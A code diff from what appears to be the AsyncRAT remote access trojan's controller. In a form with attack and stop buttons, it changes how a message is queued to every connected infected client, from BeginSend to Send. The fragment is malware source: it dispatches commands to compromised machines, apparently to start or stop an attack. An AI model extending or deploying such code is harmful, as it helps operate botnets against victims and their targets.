@@ -50,7 +50,7 @@ namespace AsyncRAT_Sharp.Forms
                     foreach (ListViewItem itm in Program.form1.listView1.Items)
                     {
                         Clients client = (Clients)itm.Tag;
-                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
                 }
                 else
@@ -59,7 +59,7 @@ namespace AsyncRAT_Sharp.Forms
                     {
                         Clients client = (Clients)itm.Tag;
                         client.LV.ForeColor = Color.Green;
-                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
                 }
                 btnStop.Enabled = true;
@@ -83,7 +83,7 @@ namespace AsyncRAT_Sharp.Forms
                 foreach (ListViewItem itm in Program.form1.listView1.Items)
                 {
                     Clients client = (Clients)itm.Tag;
-                    ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                 }
             }
             else
@@ -92,7 +92,7 @@ namespace AsyncRAT_Sharp.Forms
                 {
                     Clients client = (Clients)itm.Tag;
                     client.LV.ForeColor = Color.Empty;
-                    ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                 }
             }
             btnAttack.Enabled = true;
